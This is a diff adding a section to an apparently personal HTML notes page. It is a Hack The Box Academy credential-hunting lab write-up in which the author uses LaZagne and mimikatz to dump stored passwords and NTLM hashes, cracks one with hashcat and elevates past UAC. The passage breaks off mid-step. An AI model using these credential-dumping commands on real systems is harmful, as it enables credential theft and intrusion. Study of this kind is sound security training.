@@ -21763,6 +21763,15 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#restricted-environments" class="md-nav__link">
+    <span class="md-ellipsis">
+      Restricted Environments
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -23028,6 +23037,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-111-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1"></a>xfreerdp /v:10.129.42.144 /u:bob /p:Str0ng3ncryptedP@ss! /cert:ignore
 </span></code></pre></div></td></tr></table></div>
 <p>Results: 3ncryt10n_w0nt_4llw@ys_s@v3_y0u</p>
+<p><strong>RDP to with user "htb-student" and password "HTB_@cademy_stdnt!". Using the techniques shown in this section, find the cleartext password for the bob_adm user on the target system.</strong></p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-112-1">1</a></span>
 <span class="normal"><a href="#__codelineno-112-2">2</a></span>
 <span class="normal"><a href="#__codelineno-112-3">3</a></span>
@@ -23073,10 +23083,477 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </span><span id="__span-114-9"><a id="__codelineno-114-9" name="__codelineno-114-9"></a>\id=69b4fc18-ae09-4226-af90-175ff4092b79 bob_adm:1qazXSW@3edc!
 </span></code></pre></div></td></tr></table></div>
 <p>Results: 1qazXSW@3edc!</p>
+<p><strong>RDP to  with user "jordan" and password "HTB_@cademy_j0rdan!". Using the techniques covered in this section, retrieve the sa password for the SQL01.inlanefreight.local user account.</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-115-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1"></a>xfreerdp /v:10.129.23.186 /u:jordan /p:HTB_@cademy_j0rdan! /cert:ignore
+</span></code></pre></div></td></tr></table></div>
+<p>If we go to c:\Tools we can see that we have lazagne.exe at our disposal:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-116-1">1</a></span>
+<span class="normal"><a href="#__codelineno-116-2">2</a></span>
+<span class="normal"><a href="#__codelineno-116-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1"></a>cd c:\Tools
+</span><span id="__span-116-2"><a id="__codelineno-116-2" name="__codelineno-116-2"></a>
+</span><span id="__span-116-3"><a id="__codelineno-116-3" name="__codelineno-116-3"></a>.\lazagne.exe databases
+</span></code></pre></div></td></tr></table></div>
+<p>And the output:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-117-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-117-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-117-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-117-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-117-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-117-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-117-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-117-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-117-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-117-10">10</a></span>
+<span class="normal"><a href="#__codelineno-117-11">11</a></span>
+<span class="normal"><a href="#__codelineno-117-12">12</a></span>
+<span class="normal"><a href="#__codelineno-117-13">13</a></span>
+<span class="normal"><a href="#__codelineno-117-14">14</a></span>
+<span class="normal"><a href="#__codelineno-117-15">15</a></span>
+<span class="normal"><a href="#__codelineno-117-16">16</a></span>
+<span class="normal"><a href="#__codelineno-117-17">17</a></span>
+<span class="normal"><a href="#__codelineno-117-18">18</a></span>
+<span class="normal"><a href="#__codelineno-117-19">19</a></span>
+<span class="normal"><a href="#__codelineno-117-20">20</a></span>
+<span class="normal"><a href="#__codelineno-117-21">21</a></span>
+<span class="normal"><a href="#__codelineno-117-22">22</a></span>
+<span class="normal"><a href="#__codelineno-117-23">23</a></span>
+<span class="normal"><a href="#__codelineno-117-24">24</a></span>
+<span class="normal"><a href="#__codelineno-117-25">25</a></span>
+<span class="normal"><a href="#__codelineno-117-26">26</a></span>
+<span class="normal"><a href="#__codelineno-117-27">27</a></span>
+<span class="normal"><a href="#__codelineno-117-28">28</a></span>
+<span class="normal"><a href="#__codelineno-117-29">29</a></span>
+<span class="normal"><a href="#__codelineno-117-30">30</a></span>
+<span class="normal"><a href="#__codelineno-117-31">31</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1"></a>|====================================================================|
+</span><span id="__span-117-2"><a id="__codelineno-117-2" name="__codelineno-117-2"></a>|                                                                    |
+</span><span id="__span-117-3"><a id="__codelineno-117-3" name="__codelineno-117-3"></a>|                        The LaZagne Project                         |
+</span><span id="__span-117-4"><a id="__codelineno-117-4" name="__codelineno-117-4"></a>|                                                                    |
+</span><span id="__span-117-5"><a id="__codelineno-117-5" name="__codelineno-117-5"></a>|                          ! BANG BANG !                             |
+</span><span id="__span-117-6"><a id="__codelineno-117-6" name="__codelineno-117-6"></a>|                                                                    |
+</span><span id="__span-117-7"><a id="__codelineno-117-7" name="__codelineno-117-7"></a>|====================================================================|
+</span><span id="__span-117-8"><a id="__codelineno-117-8" name="__codelineno-117-8"></a>
+</span><span id="__span-117-9"><a id="__codelineno-117-9" name="__codelineno-117-9"></a>[+] System masterkey decrypted for c23eb53b-f1dd-47f6-b1e8-73e5446d9066
+</span><span id="__span-117-10"><a id="__codelineno-117-10" name="__codelineno-117-10"></a>[+] System masterkey decrypted for f7122927-87cd-41bc-b786-3f70200efc94
+</span><span id="__span-117-11"><a id="__codelineno-117-11" name="__codelineno-117-11"></a>[+] System masterkey decrypted for 1ef7b31a-39fd-4309-877e-c354d5a19506
+</span><span id="__span-117-12"><a id="__codelineno-117-12" name="__codelineno-117-12"></a>[+] System masterkey decrypted for 6977da93-ec45-468e-8a19-97d9865fb2e6
+</span><span id="__span-117-13"><a id="__codelineno-117-13" name="__codelineno-117-13"></a>[+] System masterkey decrypted for 59cae5c6-be85-4073-9a6c-94889ba71196
+</span><span id="__span-117-14"><a id="__codelineno-117-14" name="__codelineno-117-14"></a>
+</span><span id="__span-117-15"><a id="__codelineno-117-15" name="__codelineno-117-15"></a>########## User: jordan ##########
+</span><span id="__span-117-16"><a id="__codelineno-117-16" name="__codelineno-117-16"></a>
+</span><span id="__span-117-17"><a id="__codelineno-117-17" name="__codelineno-117-17"></a>------------------- Dbvis passwords -----------------
+</span><span id="__span-117-18"><a id="__codelineno-117-18" name="__codelineno-117-18"></a>
+</span><span id="__span-117-19"><a id="__codelineno-117-19" name="__codelineno-117-19"></a>[+] Password found !!!
+</span><span id="__span-117-20"><a id="__codelineno-117-20" name="__codelineno-117-20"></a>Name: SQL01.inlanefreight.local
+</span><span id="__span-117-21"><a id="__codelineno-117-21" name="__codelineno-117-21"></a>Driver:
+</span><span id="__span-117-22"><a id="__codelineno-117-22" name="__codelineno-117-22"></a>          SQL Server (Microsoft JDBC Driver)
+</span><span id="__span-117-23"><a id="__codelineno-117-23" name="__codelineno-117-23"></a>
+</span><span id="__span-117-24"><a id="__codelineno-117-24" name="__codelineno-117-24"></a>Host: localhost
+</span><span id="__span-117-25"><a id="__codelineno-117-25" name="__codelineno-117-25"></a>Login: sa
+</span><span id="__span-117-26"><a id="__codelineno-117-26" name="__codelineno-117-26"></a>Password: S3cret_db_p@ssw0rd!
+</span><span id="__span-117-27"><a id="__codelineno-117-27" name="__codelineno-117-27"></a>Port: 1433
+</span><span id="__span-117-28"><a id="__codelineno-117-28" name="__codelineno-117-28"></a>
+</span><span id="__span-117-29"><a id="__codelineno-117-29" name="__codelineno-117-29"></a>
+</span><span id="__span-117-30"><a id="__codelineno-117-30" name="__codelineno-117-30"></a>[+] 1 passwords have been found.
+</span><span id="__span-117-31"><a id="__codelineno-117-31" name="__codelineno-117-31"></a>For more information launch it again with the -v option
+</span></code></pre></div></td></tr></table></div>
+<p>Results: S3cret_db_p@ssw0rd!</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-118-1">1</a></span>
+<span class="normal"><a href="#__codelineno-118-2">2</a></span>
+<span class="normal"><a href="#__codelineno-118-3">3</a></span>
+<span class="normal"><a href="#__codelineno-118-4">4</a></span>
+<span class="normal"><a href="#__codelineno-118-5">5</a></span>
+<span class="normal"><a href="#__codelineno-118-6">6</a></span>
+<span class="normal"><a href="#__codelineno-118-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1"></a>------------------- Winscp passwords -----------------
+</span><span id="__span-118-2"><a id="__codelineno-118-2" name="__codelineno-118-2"></a>
+</span><span id="__span-118-3"><a id="__codelineno-118-3" name="__codelineno-118-3"></a>[+] Password found !!!
+</span><span id="__span-118-4"><a id="__codelineno-118-4" name="__codelineno-118-4"></a>URL: transfer.inlanefreight.local
+</span><span id="__span-118-5"><a id="__codelineno-118-5" name="__codelineno-118-5"></a>Login: root
+</span><span id="__span-118-6"><a id="__codelineno-118-6" name="__codelineno-118-6"></a>Password: Summer2020!
+</span><span id="__span-118-7"><a id="__codelineno-118-7" name="__codelineno-118-7"></a>Port: 22
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-119-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1"></a>whoami /priv
+</span></code></pre></div></td></tr></table></div>
+<p>The user jordan has the SeDebugPrivilege enabled. <code>SeDebugPrivilege</code> allows you to interact with and inject into processes owned by other users, including SYSTEM. This privilege is often used for privilege escalation if you have the right tooling. And I do. We have mimikatz in C:\Tools</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-120-1">1</a></span>
+<span class="normal"><a href="#__codelineno-120-2">2</a></span>
+<span class="normal"><a href="#__codelineno-120-3">3</a></span>
+<span class="normal"><a href="#__codelineno-120-4">4</a></span>
+<span class="normal"><a href="#__codelineno-120-5">5</a></span>
+<span class="normal"><a href="#__codelineno-120-6">6</a></span>
+<span class="normal"><a href="#__codelineno-120-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1"></a>cd C:\Tools\Mimikatz\x64
+</span><span id="__span-120-2"><a id="__codelineno-120-2" name="__codelineno-120-2"></a>.\mimikatz.exe
+</span><span id="__span-120-3"><a id="__codelineno-120-3" name="__codelineno-120-3"></a>
+</span><span id="__span-120-4"><a id="__codelineno-120-4" name="__codelineno-120-4"></a># Now in mimikatz:
+</span><span id="__span-120-5"><a id="__codelineno-120-5" name="__codelineno-120-5"></a>privilege::debug
+</span><span id="__span-120-6"><a id="__codelineno-120-6" name="__codelineno-120-6"></a>log creds.txt
+</span><span id="__span-120-7"><a id="__codelineno-120-7" name="__codelineno-120-7"></a>sekurlsa::logonpasswords
+</span></code></pre></div></td></tr></table></div>
+<p>Output:
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-121-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-121-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-121-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-121-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-121-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-121-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-121-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-121-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-121-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-121-10">10</a></span>
+<span class="normal"><a href="#__codelineno-121-11">11</a></span>
+<span class="normal"><a href="#__codelineno-121-12">12</a></span>
+<span class="normal"><a href="#__codelineno-121-13">13</a></span>
+<span class="normal"><a href="#__codelineno-121-14">14</a></span>
+<span class="normal"><a href="#__codelineno-121-15">15</a></span>
+<span class="normal"><a href="#__codelineno-121-16">16</a></span>
+<span class="normal"><a href="#__codelineno-121-17">17</a></span>
+<span class="normal"><a href="#__codelineno-121-18">18</a></span>
+<span class="normal"><a href="#__codelineno-121-19">19</a></span>
+<span class="normal"><a href="#__codelineno-121-20">20</a></span>
+<span class="normal"><a href="#__codelineno-121-21">21</a></span>
+<span class="normal"><a href="#__codelineno-121-22">22</a></span>
+<span class="normal"><a href="#__codelineno-121-23">23</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1"></a>Authentication Id : 0 ; 1348983 (00000000:00149577)
+</span><span id="__span-121-2"><a id="__codelineno-121-2" name="__codelineno-121-2"></a>Session           : Interactive from 0
+</span><span id="__span-121-3"><a id="__codelineno-121-3" name="__codelineno-121-3"></a>User Name         : sccm_svc
+</span><span id="__span-121-4"><a id="__codelineno-121-4" name="__codelineno-121-4"></a>Domain            : WINLPE-SRV01
+</span><span id="__span-121-5"><a id="__codelineno-121-5" name="__codelineno-121-5"></a>Logon Server      : WINLPE-SRV01
+</span><span id="__span-121-6"><a id="__codelineno-121-6" name="__codelineno-121-6"></a>Logon Time        : 4/14/2025 11:16:12 AM
+</span><span id="__span-121-7"><a id="__codelineno-121-7" name="__codelineno-121-7"></a>SID               : S-1-5-21-3769161915-3336846931-3985975925-1012
+</span><span id="__span-121-8"><a id="__codelineno-121-8" name="__codelineno-121-8"></a>        msv :
+</span><span id="__span-121-9"><a id="__codelineno-121-9" name="__codelineno-121-9"></a>         [00000006] Primary
+</span><span id="__span-121-10"><a id="__codelineno-121-10" name="__codelineno-121-10"></a>         * Username : sccm_svc
+</span><span id="__span-121-11"><a id="__codelineno-121-11" name="__codelineno-121-11"></a>         * Domain   : WINLPE-SRV01
+</span><span id="__span-121-12"><a id="__codelineno-121-12" name="__codelineno-121-12"></a>         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
+</span><span id="__span-121-13"><a id="__codelineno-121-13" name="__codelineno-121-13"></a>         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
+</span><span id="__span-121-14"><a id="__codelineno-121-14" name="__codelineno-121-14"></a>        tspkg :
+</span><span id="__span-121-15"><a id="__codelineno-121-15" name="__codelineno-121-15"></a>        wdigest :
+</span><span id="__span-121-16"><a id="__codelineno-121-16" name="__codelineno-121-16"></a>         * Username : sccm_svc
+</span><span id="__span-121-17"><a id="__codelineno-121-17" name="__codelineno-121-17"></a>         * Domain   : WINLPE-SRV01
+</span><span id="__span-121-18"><a id="__codelineno-121-18" name="__codelineno-121-18"></a>         * Password : (null)
+</span><span id="__span-121-19"><a id="__codelineno-121-19" name="__codelineno-121-19"></a>        kerberos :
+</span><span id="__span-121-20"><a id="__codelineno-121-20" name="__codelineno-121-20"></a>         * Username : sccm_svc
+</span><span id="__span-121-21"><a id="__codelineno-121-21" name="__codelineno-121-21"></a>         * Domain   : WINLPE-SRV01
+</span><span id="__span-121-22"><a id="__codelineno-121-22" name="__codelineno-121-22"></a>         * Password : (null)
+</span><span id="__span-121-23"><a id="__codelineno-121-23" name="__codelineno-121-23"></a>        ssp :
+</span></code></pre></div></td></tr></table></div></p>
+<p>We can now use hashcat to extract the NTLM:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-122-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1"></a>hashcat -m 1000 -a 0 64f12cddaa88057e06a81b54e73b949b  /usr/share/wordlists/rockyou.txt 
+</span></code></pre></div></td></tr></table></div>
+<p>Now we have the user credentials:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-123-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-123-1"><a id="__codelineno-123-1" name="__codelineno-123-1"></a>sccm_svc:Password1
+</span></code></pre></div></td></tr></table></div>
+<p>We can open a Powershell as that user and check our permissions with:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-124-1">1</a></span>
+<span class="normal"><a href="#__codelineno-124-2">2</a></span>
+<span class="normal"><a href="#__codelineno-124-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-124-1"><a id="__codelineno-124-1" name="__codelineno-124-1"></a>whoami /priv
+</span><span id="__span-124-2"><a id="__codelineno-124-2" name="__codelineno-124-2"></a>
+</span><span id="__span-124-3"><a id="__codelineno-124-3" name="__codelineno-124-3"></a>whoami /groups
+</span></code></pre></div></td></tr></table></div>
+<p>I can see that I'm part of the Administrator group. However I'm not <strong>a full Local Administrator</strong>, even though it looks like I'm part  of the <code>Administrators</code> group — but crucially, that membership is marked as "Group used for deny only", which means -I'm running a standard user token, even if I'm technically a member of the <code>Administrators</code> group. This is typical in User Account Control (UAC) environments, where admin rights are only granted when explicitly elevated (e.g. via Run as Administrator). So let's elevate privileges with:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-125-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-125-1"><a id="__codelineno-125-1" name="__codelineno-125-1"></a>Start-Process powershell -Verb runAs
+</span></code></pre></div></td></tr></table></div>
+<p>In cmd this would be:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-126-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-126-1"><a id="__codelineno-126-1" name="__codelineno-126-1"></a>runas /user:Administrator cmd
+</span></code></pre></div></td></tr></table></div>
+<p>And now we can use again mimikatz to dump all passwords:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-127-1">1</a></span>
+<span class="normal"><a href="#__codelineno-127-2">2</a></span>
+<span class="normal"><a href="#__codelineno-127-3">3</a></span>
+<span class="normal"><a href="#__codelineno-127-4">4</a></span>
+<span class="normal"><a href="#__codelineno-127-5">5</a></span>
+<span class="normal"><a href="#__codelineno-127-6">6</a></span>
+<span class="normal"><a href="#__codelineno-127-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-127-1"><a id="__codelineno-127-1" name="__codelineno-127-1"></a>cd C:\Tools\Mimikatz\x64
+</span><span id="__span-127-2"><a id="__codelineno-127-2" name="__codelineno-127-2"></a>.\mimikatz.exe
+</span><span id="__span-127-3"><a id="__codelineno-127-3" name="__codelineno-127-3"></a>
+</span><span id="__span-127-4"><a id="__codelineno-127-4" name="__codelineno-127-4"></a># Now in mimikatz:
+</span><span id="__span-127-5"><a id="__codelineno-127-5" name="__codelineno-127-5"></a>privilege::debug
+</span><span id="__span-127-6"><a id="__codelineno-127-6" name="__codelineno-127-6"></a>token::elevate
+</span><span id="__span-127-7"><a id="__codelineno-127-7" name="__codelineno-127-7"></a>lsadump::sam
+</span></code></pre></div></td></tr></table></div>
+<p>And we will obtain:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-128-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-128-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-128-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-128-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-128-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-128-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-128-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-128-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-128-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-128-10">10</a></span>
+<span class="normal"><a href="#__codelineno-128-11">11</a></span>
+<span class="normal"><a href="#__codelineno-128-12">12</a></span>
+<span class="normal"><a href="#__codelineno-128-13">13</a></span>
+<span class="normal"><a href="#__codelineno-128-14">14</a></span>
+<span class="normal"><a href="#__codelineno-128-15">15</a></span>
+<span class="normal"><a href="#__codelineno-128-16">16</a></span>
+<span class="normal"><a href="#__codelineno-128-17">17</a></span>
+<span class="normal"><a href="#__codelineno-128-18">18</a></span>
+<span class="normal"><a href="#__codelineno-128-19">19</a></span>
+<span class="normal"><a href="#__codelineno-128-20">20</a></span>
+<span class="normal"><a href="#__codelineno-128-21">21</a></span>
+<span class="normal"><a href="#__codelineno-128-22">22</a></span>
+<span class="normal"><a href="#__codelineno-128-23">23</a></span>
+<span class="normal"><a href="#__codelineno-128-24">24</a></span>
+<span class="normal"><a href="#__codelineno-128-25">25</a></span>
+<span class="normal"><a href="#__codelineno-128-26">26</a></span>
+<span class="normal"><a href="#__codelineno-128-27">27</a></span>
+<span class="normal"><a href="#__codelineno-128-28">28</a></span>
+<span class="normal"><a href="#__codelineno-128-29">29</a></span>
+<span class="normal"><a href="#__codelineno-128-30">30</a></span>
+<span class="normal"><a href="#__codelineno-128-31">31</a></span>
+<span class="normal"><a href="#__codelineno-128-32">32</a></span>
+<span class="normal"><a href="#__codelineno-128-33">33</a></span>
+<span class="normal"><a href="#__codelineno-128-34">34</a></span>
+<span class="normal"><a href="#__codelineno-128-35">35</a></span>
+<span class="normal"><a href="#__codelineno-128-36">36</a></span>
+<span class="normal"><a href="#__codelineno-128-37">37</a></span>
+<span class="normal"><a href="#__codelineno-128-38">38</a></span>
+<span class="normal"><a href="#__codelineno-128-39">39</a></span>
+<span class="normal"><a href="#__codelineno-128-40">40</a></span>
+<span class="normal"><a href="#__codelineno-128-41">41</a></span>
+<span class="normal"><a href="#__codelineno-128-42">42</a></span>
+<span class="normal"><a href="#__codelineno-128-43">43</a></span>
+<span class="normal"><a href="#__codelineno-128-44">44</a></span>
+<span class="normal"><a href="#__codelineno-128-45">45</a></span>
+<span class="normal"><a href="#__codelineno-128-46">46</a></span>
+<span class="normal"><a href="#__codelineno-128-47">47</a></span>
+<span class="normal"><a href="#__codelineno-128-48">48</a></span>
+<span class="normal"><a href="#__codelineno-128-49">49</a></span>
+<span class="normal"><a href="#__codelineno-128-50">50</a></span>
+<span class="normal"><a href="#__codelineno-128-51">51</a></span>
+<span class="normal"><a href="#__codelineno-128-52">52</a></span>
+<span class="normal"><a href="#__codelineno-128-53">53</a></span>
+<span class="normal"><a href="#__codelineno-128-54">54</a></span>
+<span class="normal"><a href="#__codelineno-128-55">55</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-128-1"><a id="__codelineno-128-1" name="__codelineno-128-1"></a>RID  : 000001f4 (500)
+</span><span id="__span-128-2"><a id="__codelineno-128-2" name="__codelineno-128-2"></a>User : Administrator
+</span><span id="__span-128-3"><a id="__codelineno-128-3" name="__codelineno-128-3"></a>  Hash NTLM: 7796ee39fd3a9c3a1844556115ae1a54
+</span><span id="__span-128-4"><a id="__codelineno-128-4" name="__codelineno-128-4"></a>
+</span><span id="__span-128-5"><a id="__codelineno-128-5" name="__codelineno-128-5"></a>RID  : 000001f5 (501)
+</span><span id="__span-128-6"><a id="__codelineno-128-6" name="__codelineno-128-6"></a>User : Guest
+</span><span id="__span-128-7"><a id="__codelineno-128-7" name="__codelineno-128-7"></a>
+</span><span id="__span-128-8"><a id="__codelineno-128-8" name="__codelineno-128-8"></a>RID  : 000001f7 (503)
+</span><span id="__span-128-9"><a id="__codelineno-128-9" name="__codelineno-128-9"></a>User : DefaultAccount
+</span><span id="__span-128-10"><a id="__codelineno-128-10" name="__codelineno-128-10"></a>
+</span><span id="__span-128-11"><a id="__codelineno-128-11" name="__codelineno-128-11"></a>RID  : 000003e8 (1000)
+</span><span id="__span-128-12"><a id="__codelineno-128-12" name="__codelineno-128-12"></a>User : jordan
+</span><span id="__span-128-13"><a id="__codelineno-128-13" name="__codelineno-128-13"></a>  Hash NTLM: 30689ae6de22596f45afb9619f8e5fa0
+</span><span id="__span-128-14"><a id="__codelineno-128-14" name="__codelineno-128-14"></a>
+</span><span id="__span-128-15"><a id="__codelineno-128-15" name="__codelineno-128-15"></a>RID  : 000003e9 (1001)
+</span><span id="__span-128-16"><a id="__codelineno-128-16" name="__codelineno-128-16"></a>User : sarah
+</span><span id="__span-128-17"><a id="__codelineno-128-17" name="__codelineno-128-17"></a>  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
+</span><span id="__span-128-18"><a id="__codelineno-128-18" name="__codelineno-128-18"></a>Welcome1 
+</span><span id="__span-128-19"><a id="__codelineno-128-19" name="__codelineno-128-19"></a>
+</span><span id="__span-128-20"><a id="__codelineno-128-20" name="__codelineno-128-20"></a>RID  : 000003ea (1002)
+</span><span id="__span-128-21"><a id="__codelineno-128-21" name="__codelineno-128-21"></a>User : helpdesk
+</span><span id="__span-128-22"><a id="__codelineno-128-22" name="__codelineno-128-22"></a>  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
+</span><span id="__span-128-23"><a id="__codelineno-128-23" name="__codelineno-128-23"></a>Welcome1
+</span><span id="__span-128-24"><a id="__codelineno-128-24" name="__codelineno-128-24"></a>
+</span><span id="__span-128-25"><a id="__codelineno-128-25" name="__codelineno-128-25"></a>RID  : 000003eb (1003)
+</span><span id="__span-128-26"><a id="__codelineno-128-26" name="__codelineno-128-26"></a>User : secsvc
+</span><span id="__span-128-27"><a id="__codelineno-128-27" name="__codelineno-128-27"></a>  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
+</span><span id="__span-128-28"><a id="__codelineno-128-28" name="__codelineno-128-28"></a>Welcome1
+</span><span id="__span-128-29"><a id="__codelineno-128-29" name="__codelineno-128-29"></a>
+</span><span id="__span-128-30"><a id="__codelineno-128-30" name="__codelineno-128-30"></a>RID  : 000003ec (1004)
+</span><span id="__span-128-31"><a id="__codelineno-128-31" name="__codelineno-128-31"></a>User : htb-student
+</span><span id="__span-128-32"><a id="__codelineno-128-32" name="__codelineno-128-32"></a>  Hash NTLM: 3c0e5d303ec84884ad5c3b7876a06ea6
+</span><span id="__span-128-33"><a id="__codelineno-128-33" name="__codelineno-128-33"></a>
+</span><span id="__span-128-34"><a id="__codelineno-128-34" name="__codelineno-128-34"></a>RID  : 000003ed (1005)
+</span><span id="__span-128-35"><a id="__codelineno-128-35" name="__codelineno-128-35"></a>User : htb-student_adm
+</span><span id="__span-128-36"><a id="__codelineno-128-36" name="__codelineno-128-36"></a>  Hash NTLM: cf3a5525ee9414229e66279623ed5c58
+</span><span id="__span-128-37"><a id="__codelineno-128-37" name="__codelineno-128-37"></a>Welcome1
+</span><span id="__span-128-38"><a id="__codelineno-128-38" name="__codelineno-128-38"></a>
+</span><span id="__span-128-39"><a id="__codelineno-128-39" name="__codelineno-128-39"></a>
+</span><span id="__span-128-40"><a id="__codelineno-128-40" name="__codelineno-128-40"></a>RID  : 000003f1 (1009)
+</span><span id="__span-128-41"><a id="__codelineno-128-41" name="__codelineno-128-41"></a>User : sql_dev
+</span><span id="__span-128-42"><a id="__codelineno-128-42" name="__codelineno-128-42"></a>  Hash NTLM: c1b1a60715be1bb3f9e5a03092029c0b
+</span><span id="__span-128-43"><a id="__codelineno-128-43" name="__codelineno-128-43"></a>
+</span><span id="__span-128-44"><a id="__codelineno-128-44" name="__codelineno-128-44"></a>RID  : 000003f2 (1010)
+</span><span id="__span-128-45"><a id="__codelineno-128-45" name="__codelineno-128-45"></a>User : logger
+</span><span id="__span-128-46"><a id="__codelineno-128-46" name="__codelineno-128-46"></a>  Hash NTLM: 3c0e5d303ec84884ad5c3b7876a06ea6
+</span><span id="__span-128-47"><a id="__codelineno-128-47" name="__codelineno-128-47"></a>
+</span><span id="__span-128-48"><a id="__codelineno-128-48" name="__codelineno-128-48"></a>RID  : 000003f4 (1012)
+</span><span id="__span-128-49"><a id="__codelineno-128-49" name="__codelineno-128-49"></a>User : sccm_svc
+</span><span id="__span-128-50"><a id="__codelineno-128-50" name="__codelineno-128-50"></a>  Hash NTLM: 64f12cddaa88057e06a81b54e73b949b
+</span><span id="__span-128-51"><a id="__codelineno-128-51" name="__codelineno-128-51"></a>Password1
+</span><span id="__span-128-52"><a id="__codelineno-128-52" name="__codelineno-128-52"></a>
+</span><span id="__span-128-53"><a id="__codelineno-128-53" name="__codelineno-128-53"></a>RID  : 000003f5 (1013)
+</span><span id="__span-128-54"><a id="__codelineno-128-54" name="__codelineno-128-54"></a>User : mrb3n
+</span><span id="__span-128-55"><a id="__codelineno-128-55" name="__codelineno-128-55"></a>  Hash NTLM: 7796ee39fd3a9c3a1844556115ae1a54
+</span></code></pre></div></td></tr></table></div>
+<p>Now we can access as Administrator via RDP. For that, before closing the Administrator console we will modify the registry</p>
